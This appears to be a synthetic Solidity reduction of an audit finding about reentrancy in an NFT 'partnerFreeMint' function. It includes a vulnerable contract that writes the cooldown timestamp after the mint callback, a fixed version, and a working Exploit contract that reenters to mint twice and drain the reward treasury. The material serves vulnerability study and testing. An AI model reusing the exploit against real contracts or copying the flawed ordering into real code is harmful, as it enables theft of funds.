// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*  Heurist partnerFreeMint — _safeMint runs before lastMinted is written
    (Zokyo, finding 37689).

    SYNTHETIC, cheatcode-free reduction. The receiver reenters from the mint
    callback while lastMinted is still zero and bypasses the 24h limit.
    Two NFTs are minted. The fair order writes lastMinted first and the
    reentered call reverts, so only one mint is paid.

    run() does not warp. */

contract Reward {
    mapping(address => uint256) public balanceOf;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

contract PartnerNFT {
    mapping(address => uint256) public balanceOf;

    function mint(address to) external {
        balanceOf[to] += 1;
    }
}

interface IReceiver {
    function onERC721Received(address operator, address from, uint256 id, bytes calldata data) external;
}

contract Collection {
    PartnerNFT public partner;
    Reward public reward;
    uint256 public nextId;
    uint256 public minted;
    mapping(address => uint256) public lastMinted;
    mapping(uint256 => address) public ownerOf;

    constructor(PartnerNFT partner_, Reward reward_) {
        partner = partner_;
        reward = reward_;
    }

    function partnerFreeMint(address to) external {
        require(partner.balanceOf(msg.sender) > 0, "partner");
        require(lastMinted[msg.sender] == 0 || block.timestamp >= lastMinted[msg.sender] + 1 days, "24h");
        _safeMint(to);
        // @> VULN: lastMinted is written after _safeMint, so the receiver reenters inside the 24h window
        lastMinted[msg.sender] = block.timestamp == 0 ? 1 : block.timestamp;
    }

    function _safeMint(address to) internal {
        uint256 id = ++nextId;
        ownerOf[id] = to;
        minted += 1;
        reward.transfer(to, 1 ether);
        if (to.code.length > 0) {
            IReceiver(to).onERC721Received(msg.sender, address(0), id, "");
        }
    }
}

contract CollectionFixed {
    PartnerNFT public partner;
    Reward public reward;
    uint256 public nextId;
    mapping(address => uint256) public lastMinted;
    mapping(uint256 => address) public ownerOf;

    constructor(PartnerNFT partner_, Reward reward_) {
        partner = partner_;
        reward = reward_;
    }

    function partnerFreeMint(address to) external {
        require(partner.balanceOf(msg.sender) > 0, "partner");
        require(lastMinted[msg.sender] == 0 || block.timestamp >= lastMinted[msg.sender] + 1 days, "24h");
        lastMinted[msg.sender] = block.timestamp == 0 ? 1 : block.timestamp;
        uint256 id = ++nextId;
        ownerOf[id] = to;
        reward.transfer(to, 1 ether);
        if (to.code.length > 0) {
            IReceiver(to).onERC721Received(msg.sender, address(0), id, "");
        }
    }
}

contract Exploit {
    uint256 public constant MINTED = 2 ether;
    uint256 public constant FAIR = 1 ether;
    uint256 public constant EXTRA = 1 ether;

    PartnerNFT public partner;
    Reward public reward;
    Collection public collection;
    uint256 public received;
    uint256 public nfts;
    bool internal retried;

    constructor() {
        partner = new PartnerNFT();
        reward = new Reward();
        collection = new Collection(partner, reward);
        reward.mint(address(collection), 2 ether);
        partner.mint(address(this));
    }

    function onERC721Received(address, address, uint256, bytes calldata) external {
        if (retried) return;
        retried = true;
        collection.partnerFreeMint(address(this));
    }

    function run() external {
        collection.partnerFreeMint(address(this));
        received = reward.balanceOf(address(this));
        nfts = collection.minted();
        require(nfts == 2, "two nfts");
        require(received == MINTED, "received");
        require(received - FAIR == EXTRA, "extra");
        require(collection.lastMinted(address(this)) != 0, "stamped after");
        require(reward.balanceOf(address(collection)) == 0, "treasury empty");
    }
}
